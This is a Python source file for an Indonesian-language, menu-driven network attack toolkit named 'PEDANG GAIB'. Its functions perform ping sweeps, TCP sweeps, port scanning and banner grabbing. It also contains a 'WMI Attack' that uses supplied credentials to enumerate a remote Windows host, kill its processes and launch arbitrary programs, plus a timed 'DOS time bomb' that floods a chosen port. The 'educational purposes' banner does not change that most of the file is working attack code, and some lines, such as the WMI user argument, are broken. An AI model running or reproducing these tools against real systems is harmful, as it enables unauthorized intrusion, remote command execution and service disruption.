import os, socket, subprocess, time, threading, urllib, wmi
from datetime import datetime
from queue import Queue
from bs4 import BeautifulSoup

def getIP():
    host=input("url: ")
    print (socket.gethostbyname(host))

def ping_sweep():
    net = input("IP adrees target: ")
    net1= net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Nomor awal: "))
    en1 = int(input("Nomor akhir: "))
    en1=en1+1
    t1= datetime.now()
    print ("Ping sweep dalam proses:")
    for ip in range(st1,en1):
        alamat = net2+str(ip)
        res = subprocess.call(['ping', alamat]) 
        if res == 0: print( "ping ke", alamat, "OK") 

    t2= datetime.now()
    total =t2-t1
    print ("Selesai selama: ",total)

def traceroute():
    ip=input("IP address target: ")
    results=os.popen("pathping "+str(ip))	
    for i in results:print (i)

def tcp_sweep():
    net= input("IP address target: ")
    net1= net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Nomor IP awal: "))
    en1 = int(input("Nomor IP akhir: "))
    port = int(input("Nomor Port: "))
    en1=en1+1
    t1= datetime.now()
    def scan(addr):
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((addr,port))
        if result==0:return 1
        else :return 0

    def run1():
        for ip in range(st1,en1):
            addr = net2+str(ip)
            if (scan(addr)):print (addr , "hidup")

    run1()
    t2= datetime.now()
    total =t2-t1
    print ("Scanning selesai dalam: " , total)

def port_scanner():
    socket.setdefaulttimeout(0.25)
    print_lock = threading.Lock()
    target = input('IP Target: ')
    t_IP = socket.gethostbyname(target)
    print ('Mulai menscan target: ', t_IP)

    def portscan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            con = s.connect((t_IP, port))
            with print_lock:print(port, ' terbuka')
            con.close()
        except:pass

    def threader():
        while True:
            worker = q.get()
            portscan(worker)
            q.task_done()

    q = Queue()
    startTime = time.time()

    for x in range(100):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    for worker in range(1, 700): q.put(worker)

    q.join()
    print('Waktu yang digunakan:', time.time() - startTime)

def banner_grabber():
    jawab = 'y'
    while(jawab == 'y'):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        alamat= input("IP Address: ")
        port = input("Port: ")
        result= s.connect_ex((alamat,int(port)))
        if result==0:
            if port==80: s.send(b'GET / HTTP/1.1\r\n\r\n')
            try:
                banner = s.recv(4096)
                print (banner.decode('ascii'))
            except:print ("Gagal, tidak ada banner")
            finally:s.close()
        else:
            print ("Port " + port + " tidak hidup")
            s.close()
        jawab = input("Ulang lagi tidak (y/n)? ")
        if jawab != 'y': break

def get_hyperlink():
    url = input("Masukkan URL : ") 
    page= urllib.request.urlopen(url)
    soup_object = BeautifulSoup(page.read())
    print (soup_object.title)
    print (soup_object.title.text)
    for link in soup_object.find_all('a'):print(link.get('href'))

def wmi_attack():
    ip=input("IP:")
    username=input("Username:")
    passwd=input("Password:")
    try:
        c = wmi.WMI(ip,user=r+username,password=passwd)
        for os in c.Win32_OperatingSystem():print (os.Caption) 

        isJalan1=input("Lihat Daftar fixed drive target?(y/n)")
        if isJalan1=="y":
            print ("--------Daftar Fixed Drive---------")
            for disk in c.Win32_LogicalDisk(DriveType=3):print (disk)

        isJalan2=input("Lihat Daftar Service Windows target?(y/n)")
        if isJalan2=="y":
            print ("--------Daftar Service Windows---------")
            for service in c.Win32_Service(State="Running"):print (service.Name)

        isJalan3=input("Lihat Daftar running aplikasi Windows target?(y/n)")
        if isJalan3=="y":
            for i in c.Win32_Process(["Caption", "ProcessID"]):print (i.Caption, i. ProcessID)
            dead=input("Ada program yang ingin dimatikan?(y/n)")
            if dead=="y":
                noid=input("id program yang akan dimatikan? ")
                c.Win32_Process(ProcessId=noid)[0].Terminate()

        isJalan4=input("Lihat Daftar & usernya sistem windows target?(y/n)")
        if isJalan4=="y":
            for group in c.Win32_Group():
                print (group.Caption+":")
                for user in group.associators(wmi_result_class="Win32_UserAccount"):print ("- " + user.Caption)

        isJalan5=input("Jalankan aplikasi tertentu pada komputer target?(y/n")
        if isJalan5=="y":
            aplikasi=input("Nama aplikasi yang akan dijalankan")
            SW_SHOWNORMAL = 1
            try:
                process_startup = c.Win32_ProcessStartup.new()
                process_startup.ShowWindow = SW_SHOWNORMAL
                process_id, result = c.Win32_Process.Create(CommandLine=aplikasi, ProcessStartupInformation=process_startup)
                if result == 0:print ("Process started successfully: %d" % process_id)
                else:print ("Gagal")
            except:print ("Error")
    except:print ("WMI Attack Gagal")

def dos_timebomb():
    jawab = 'y'
    while(jawab == 'y'): 
        alamat= input("IP Address: ")
        port = input("Port: ")
        awal=input("Jam mulai DOS? ")
        akhir=input("jam selesai DOS? ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        waktu=time.strftime("%H", time.localtime())
        if str(waktu)==str(awal):
            try:
                result= s.connect_ex((alamat,int(port)))
                if port==80: s.send(b'GET / HTTP/1.1\r\n\r\n')
                s.send(b'Serangaaaaaaaaaan')
            except:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            if str(waktu)==str(akhir):
                break
                s.close()

def tampilan_atas():
    print ("===================================================")
    print ("#                                                 #")
    print ("#          PEDANG GAIB versi 1.0                  #")
    print ("#          ---------------------                  #")
    print ("#          created by Wardana, 11-6-2019          #")
    print ("# info:                                           #")
    print ("# - Dirancang untuk python versi 3.7.1 bukan 2    #")
    print ("# - Dirancang untuk tujuan pendidikan semata      #")
    print ("# - Segala resiko tanggung sediri!!!!             #")
    print ("#   Gue ndak bertanggung jawab atas kerusakannya  #")
    print ("#                                                 #")
    print ("===================================================")

def menu():
    print ("\n")
    print ("----------- MENU ----------")
    print ("[1] Dapatkan IP dari nama host")
    print ("[2] Ping Sweep IP")
    print ("[3] Traceroute IP")
    print ("[4] TCP Sweep IP")
    print ("[5] Port Scanning IP")
    print ("[6] Banner Grabber IP")
    print ("[7] Data hyperlink website")
    print ("[8] WMI Attack")
    print ("[9] DOS time bomb")
    print ("[x] Keluar alias exit")

    menu = input("PILIH MENU> ")
    print ("\n")

    if menu == "1":getIP()
    elif menu == "2":ping_sweep()
    elif menu == "3":traceroute()
    elif menu == "4":tcp_sweep()
    elif menu == "5":port_scanner()
    elif menu == "6":banner_grabber()
    elif menu == "7":get_hyperlink()
    elif menu == "8":wmi_attack()
    elif menu == "9":dos_timebomb()
    elif menu == "x":
        print ("Terima kasih sudah menggunakan aplikasi ini\n Sampai jumpa")
        exit()
    else:
        print ("Salah pilih!")                       

tampilan_atas()
jawab = 'y'
while(jawab == 'y'):
    menu()
    jawab = input("Ulang lagi tidak (y/n)? ")
    if jawab != 'y': 
        print ("Terima kasih sudah menggunakan aplikasi ini\n Sampai jumpa")
        break  